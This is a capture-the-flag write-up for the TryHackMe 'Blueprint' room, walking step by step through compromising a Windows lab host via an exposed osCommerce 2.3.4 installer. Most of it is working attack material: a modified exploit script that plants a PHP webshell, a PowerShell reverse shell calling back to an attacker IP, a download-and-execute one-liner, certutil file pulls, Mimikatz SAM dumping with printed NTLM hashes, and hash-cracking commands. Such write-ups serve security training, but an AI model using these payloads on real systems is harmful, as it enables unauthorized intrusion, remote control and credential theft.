#Blueprint

Hack into this Windows machine and escalate your privileges to Administrator.

Room: https://tryhackme.com/room/blueprint

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: [https://github.com/garthheff/CTF-Hints/](https://github.com/garthheff/CTF-Hints/blob/main/blueprint.md)

## Overview

The target was running an osCommerce 2.3.4 install under XAMPP on Windows. The key issue was that the `/install/` directory was still present after installation. The public exploit for this condition abuses the installer step 4 process to write attacker controlled content into the generated PHP configuration file.

The original exploit needed small changes for this target because the web server used HTTPS with a weak certificate. Python refused to complete the TLS handshake until certificate validation and the OpenSSL security level were bypassed.

The high level chain was:

1. Run initial Nmap enumeration and identify the exposed web services.
2. Discover osCommerce and the exposed install directory.
3. Modify Exploit DB 50128 to ignore certificate errors and weak certificate settings.
4. Inject PHP into `install/includes/configure.php`.
5. Replace blocked `system()` execution with `passthru()`.
6. Confirm command execution as `NT AUTHORITY\SYSTEM`.
7. Use the webshell to trigger a reverse shell.
8. Move the correct 32 bit Mimikatz binary onto the target.
9. Dump the local SAM hashes.
10. Recover the `Lab` user NTLM hash and crack it with hashes.com.
11. Read the Administrator desktop flag.


## Initial Nmap scan

The first scan was a basic TCP scan against the target. This showed multiple Windows services, HTTP on port 80, HTTPS on port 443, MySQL on port 3306, and another HTTP style service on port 8080.

```bash
root@ip-[REDACTED]:~# nmap [REDACTED_IP]
Starting Nmap 7.80 ( https://nmap.org ) at 2026-05-02 09:53 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for [REDACTED_IP]
Host is up (0.24s latency).
Not shown: 990 closed ports
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
443/tcp   open  https
445/tcp   open  microsoft-ds
3306/tcp  open  mysql
8080/tcp  open  http-proxy
49152/tcp open  unknown
49153/tcp open  unknown
49154/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 19.18 seconds
```

The HTTPS service was the important path for this attack. Browsing the web application led to the osCommerce installation under:

```text
https://[REDACTED_IP]/oscommerce-2.3.4/catalog/
```

## Exploit preparation

The exploit used was based on:

```text
https://www.exploit-db.com/exploits/50128
```

The target URLs were:

```text
https://[REDACTED_IP]/oscommerce-2.3.4/catalog/
https://[REDACTED_IP]/oscommerce-2.3.4/catalog/install/install.php?step=4
```

The issue came from the installer writing attacker supplied values into a PHP config file. The vulnerable value was `DB_DATABASE`.

Original payload style:

```php
'); system("ls"); /*
```

The target was Windows, so later commands used Windows syntax.

## Updated Python exploit for weak HTTPS certificates

The first run failed because Python rejected the target certificate:

```text
ssl.SSLCertVerificationError: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: EE certificate key too weak
```

The script was updated to disable normal certificate validation and reduce the OpenSSL security level for the request.

```python
import ssl
import requests
import urllib3
from requests.adapters import HTTPAdapter
from urllib3.poolmanager import PoolManager

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class WeakSSLAdapter(HTTPAdapter):
    def init_poolmanager(self, connections, maxsize, block=False):
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        ctx.set_ciphers("DEFAULT:@SECLEVEL=1")

        self.poolmanager = PoolManager(
            num_pools=connections,
            maxsize=maxsize,
            block=block,
            ssl_context=ctx
        )

base_url = "https://[REDACTED_IP]/oscommerce-2.3.4/catalog/"
target_url = "https://[REDACTED_IP]/oscommerce-2.3.4/catalog/install/install.php?step=4"

data = {
    "DIR_FS_DOCUMENT_ROOT": "./"
}

payload = "');"
payload += 'echo "<pre>"; if(isset($_GET["cmd"])){passthru($_GET["cmd"]);} echo "</pre>";'
payload += "/*"

data["DB_DATABASE"] = payload

session = requests.Session()
session.mount("https://", WeakSSLAdapter())

r = session.post(
    url=target_url,
    data=data,
    verify=False
)

if r.status_code == 200:
    print("[+] Successfully launched the exploit.")
    print("[+] Open this URL to execute commands:")
    print()
    print(base_url + "install/includes/configure.php?cmd=whoami")
else:
    print("[-] Exploit did not execute as planned")
    print("Status:", r.status_code)
    print()
    print(r.text[:500])
```

## First command execution attempt

The original command execution function was blocked:

```text
Warning:  Unterminated comment starting line 27 in C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes\configure.php on line 27

Warning:  system() has been disabled for security reasons in C:\xampp\htdocs\oscommerce-2.3.4\catalog\install\includes\configure.php on line 27
```

This still proved the PHP injection worked, but `system()` could not be used. Swapping to `passthru()` worked.

Test payload:

```python
payload = "');"
payload += 'passthru("whoami");'
payload += "/*"
```

Result:

```text
nt authority\system
```

This confirmed unauthenticated remote code execution as the highest local Windows privilege.

## Reusable webshell

Instead of editing the payload for every command, the config file was turned into a small command runner:

```php
echo "<pre>"; if(isset($_GET["cmd"])){passthru($_GET["cmd"]);} echo "</pre>";
```

Commands could then be executed with the `cmd` query parameter.

Example:

```bash
curl -k "https://[REDACTED_IP]/oscommerce-2.3.4/catalog/install/includes/configure.php?cmd=whoami"
```

Expected output:

```text
nt authority\system
```

Useful Windows checks:

```bash
curl -k "https://[REDACTED_IP]/oscommerce-2.3.4/catalog/install/includes/configure.php?cmd=hostname"
```

```bash
curl -k "https://[REDACTED_IP]/oscommerce-2.3.4/catalog/install/includes/configure.php?cmd=dir%20C:%5CUsers"
```


## Getting a reverse shell

The `cmd` webshell was enough for command execution, but a reverse shell made post exploitation easier. First, outbound HTTP was tested by serving files from the AttackBox.

On the AttackBox:

```bash
python3 -m http.server 80
```

From the target through command execution, `certutil` could be used to pull a file from the AttackBox.

```cmd
certutil -urlcache -f http://[ATTACKBOX_IP]/test.txt C:\Windows\Temp\test.txt
```

Once callbacks worked, a PowerShell reverse shell was prepared on the AttackBox as `shell.ps1`.

```powershell
$client = New-Object System.Net.Sockets.TCPClient("[ATTACKBOX_IP]",4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
$sendback = (iex $data 2>&1 | Out-String )
$sendback2 = $sendback + "PS " + (pwd).Path + "> "
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
$stream.Write($sendbyte,0,$sendbyte.Length)
$stream.Flush()
}
$client.Close()
```

A listener was started on the AttackBox:

```bash
nc -lvnp 4444
```

The reverse shell was then triggered using the webshell `cmd` parameter.

```bash
curl -k "https://[REDACTED_IP]/oscommerce-2.3.4/catalog/install/includes/configure.php?cmd=powershell%20-NoProfile%20-ExecutionPolicy%20Bypass%20-c%20%22IEX(New-Object%20Net.WebClient).DownloadString('http://[ATTACKBOX_IP]/shell.ps1')%22"
```

After this, commands were run from the PowerShell reverse shell instead of repeatedly using the browser or curl based webshell. The shell was already running with SYSTEM privileges because Apache/XAMPP was running as `NT AUTHORITY\SYSTEM`.

## Attempting RDP

Since the shell was running as SYSTEM, RDP was worth trying. The local Administrators group only contained the built in Administrator account.

```powershell
PS C:\> net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
The command completed successfully.
```

The usual RDP enable commands were attempted:

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=yes
net start TermService
```

Port 3389 did not open. This was still worth testing, but not required because SYSTEM command execution was already available.

## Moving Mimikatz onto the target

Mimikatz was available on the AttackBox. The first folder checked was the x64 build:

```bash
root@ip-[REDACTED]:/opt/Mimikatz/x64# ls
mimidrv.sys  mimikatz.exe  mimilib.dll
```

The x64 binary did not behave as expected because the target was 32 bit. For basic `lsadump::sam`, only `mimikatz.exe` was required. `mimilib.dll` and `mimidrv.sys` were not needed for this step.

Helpful architecture checks from the target shell:

```cmd
wmic os get osarchitecture
echo %PROCESSOR_ARCHITECTURE%
echo %PROCESSOR_ARCHITEW6432%
```

After confirming the target was 32 bit, the 32 bit build was served from the AttackBox.

On the AttackBox:

```bash
cd /opt/Mimikatz/Win32
python3 -m http.server 80
```

On the Windows target from the reverse shell:

```powershell
PS C:\> cd C:\Windows\Temp
PS C:\Windows\Temp> certutil -urlcache -f http://[ATTACKBOX_IP]/mimikatz.exe mimikatz.exe
****  Online  ****
CertUtil: -URLCache command completed successfully.
```

Once the 32 bit version was downloaded, Mimikatz was run non interactively so the output could be redirected to a file.

## Dumping SAM hashes with Mimikatz

Command used on the target:

```powershell
PS C:\> .\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit" > C:\Windows\Temp\mimi.txt 2>&1
type C:\Windows\Temp\mimi.txt
```

Output:

```text
PS C:\> 
  .#####.   mimikatz 2.2.0 (x86) #19041 Aug  9 2020 22:44:48
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > http://pingcastle.com / http://mysmartlogon.com   ***/

mimikatz(commandline) # privilege::debug
Privilege '20' OK

mimikatz(commandline) # token::elevate
Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

304	{0;000003e7} 0 D 13686     	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,30p)	Primary
 -> Impersonated !
 * Process Token : {0;000003e7} 0 D 8483756   	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,27p)	Primary
 * Thread Token  : {0;000003e7} 0 D 8504425   	NT AUTHORITY\SYSTEM	S-1-5-18	(04g,30p)	Impersonation (Delegation)

mimikatz(commandline) # lsadump::sam
Domain : BLUEPRINT
SysKey : [REDACTED]
Local SID : S-1-5-21-3130159037-241736515-3168549210

SAMKey : [REDACTED]

RID  : 000001f4 (500)
User : Administrator
  Hash NTLM: 25451b15eeabfa492d9a18442a6e914b

RID  : 000001f5 (501)
User : Guest

RID  : 000003e8 (1000)
User : Lab
  Hash NTLM: 30e87bfxxxxxxxxxxddde4c450

mimikatz(commandline) # exit
Bye!
```

The important value was the `Lab` user's NTLM hash:

```text
30e87bf999xxxxxxxxxxx09ddde4c450
```

## Cracking the Lab hash

The `Lab` NTLM hash was cracked using hashes.com.

The recovered password is redacted here.

```text
Lab:[REDACTED_PASSWORD]
```

If cracking locally, the same hash could be placed into a file and cracked as NTLM.

```bash
echo '30e87bf999828446a1c1209ddde4c450' > lab.hash
hashcat -m 1000 lab.hash /usr/share/wordlists/rockyou.txt
hashcat -m 1000 lab.hash --show
```

Or with John:

```bash
john --format=NT lab.hash --wordlist=/usr/share/wordlists/rockyou.txt
john --show --format=NT lab.hash
```

## Reading the Administrator flag

Since command execution was already running as SYSTEM, the Administrator desktop could be accessed directly.

```powershell
PS C:\> cd users/administrator
PS C:\users\administrator> cd desktop
PS C:\users\administrator\desktop> ls


    Directory: C:\users\administrator\desktop


Mode                LastWriteTime     Length Name                              
----                -------------     ------ ----                              
-a---        11/27/2019   6:15 PM         37 root.txt.txt                      


PS C:\users\administrator\desktop> cat root.txt.xt
PS C:\users\administrator\desktop> cat root.txt.txt
THM{[REDACTED_FLAG]}
PS C:\users\administrator\desktop> 
```

Root flag:

```text
THM{[REDACTED_FLAG]}
```

### Missed Shortcut: Exposed SAM and SYSTEM Hives

While browsing the web service on port 8080, the /docs/ directory exposed several files:

http://TARGET:8080/oscommerce-2.3.4/docs/

Inside this directory were two very interesting files:

SAM
SYSTEM

These are Windows registry hive names. The SAM hive stores local account password hashes, while the SYSTEM hive contains the boot key needed to decrypt those hashes. Because both files were exposed over HTTP, we could have downloaded them directly and extracted the NTLM hashes offline.

wget http://TARGET:8080/oscommerce-2.3.4/docs/SAM
wget http://TARGET:8080/oscommerce-2.3.4/docs/SYSTEM

Once downloaded, secretsdump from Impacket can be used to extract the local NTLM hashes:

impacket-secretsdump -sam SAM -system SYSTEM LOCAL

This would reveal hashes for local users, including the Lab user:

Lab:1000:aad3b435xxxxx35b51404ee:30e87bf9998xxxxx09ddde4c450:::

This was a much shorter route than using RCE to upload and run Mimikatz. The key lesson is that files named SAM and SYSTEM in a web-accessible directory are highly suspicious and should be investigated immediately.


## Key takeaways

Leaving `/install/` behind on osCommerce allowed unauthenticated PHP code injection into the generated configuration file.

Even though `system()` was disabled, another execution function, `passthru()`, was available and allowed command execution.

The web server was running under XAMPP as `NT AUTHORITY\SYSTEM`, so the initial web RCE immediately provided full local privileges.

The target was 32 bit, so the 32 bit Mimikatz binary was required.

The `Lab` user's NTLM hash was recovered from the SAM database and cracked externally using hashes.com.
